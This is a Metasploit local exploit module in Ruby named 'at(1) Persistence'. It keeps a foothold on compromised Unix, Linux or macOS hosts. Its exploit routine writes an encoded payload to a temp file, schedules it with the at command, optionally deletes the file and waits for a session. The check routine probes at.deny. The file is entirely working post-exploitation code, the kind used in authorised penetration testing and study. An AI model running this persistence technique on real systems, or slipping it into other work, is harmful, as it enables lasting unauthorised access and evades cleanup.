##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'at(1) Persistence',
        'Description'    => %q(
          This module achieves persisience by executing payloads via at(1).
        ),
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'Jon Hart <jon_hart@rapid7.com>'
          ],
        'Targets'        => [['Automatic', {} ]],
        'DefaultTarget'  => 0,
        'Platform'       => ['unix', 'linux', 'osx'],
        'Arch'           => ARCH_CMD,
        'Payload'        =>
        {
          'Compat'     =>
          {
            'PayloadType'  => 'cmd',
            'RequiredCmd'  => 'generic perl ruby python'
          }
        },
        'DefaultOptions' => { 'WfsDelay' => 60 },
        'DisclosureDate' => "Jan 1 1997" # http://pubs.opengroup.org/onlinepubs/007908799/xcu/at.html
      )
    )

    register_options(
      [
        OptString.new('TIME', [false, 'When to run job via at(1).  Changing may require WfsDelay to be adjusted', 'now + 1 minute']),
        OptBool.new('CLEANUP', [true, 'Delete payload after execution', true])
      ]
    )

    register_advanced_options(
      [
        OptString.new('PATH', [false, 'Path to store payload to be executed by at(1).  Leave unset to use mktemp'])
      ]
    )
  end

  def check
    token = "fail #{Rex::Text.rand_text_alphanumeric(8)}"
    if cmd_exec("at -l || echo #{token}") =~ /#{token}/
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Vulnerable
    end
  end

  def cmd_exec(cmd)
    super("PATH=/bin:/usr/bin:/usr/local/bin #{cmd}")
  end

  def exploit
    unless check == Exploit::CheckCode::Vulnerable
      fail_with(Failure::NoAccess, 'User denied cron via at.deny')
    end

    unless payload_file = datastore['PATH'] || cmd_exec('mktemp')
      fail_with(Failure::BadConfig, 'Unable to find suitable location for payload')
    end

    write_file(payload_file, payload.encoded)
    cmd_exec("at -f #{payload_file} #{datastore['TIME']}")
    register_files_for_cleanup(payload_file) if datastore['CLEANUP']
    print_status("Waiting #{datastore['WfsDelay']}sec for execution")
    0.upto(datastore['WfsDelay'].to_i) do
      Rex.sleep(1)
      break if session_created?
    end
  end
end
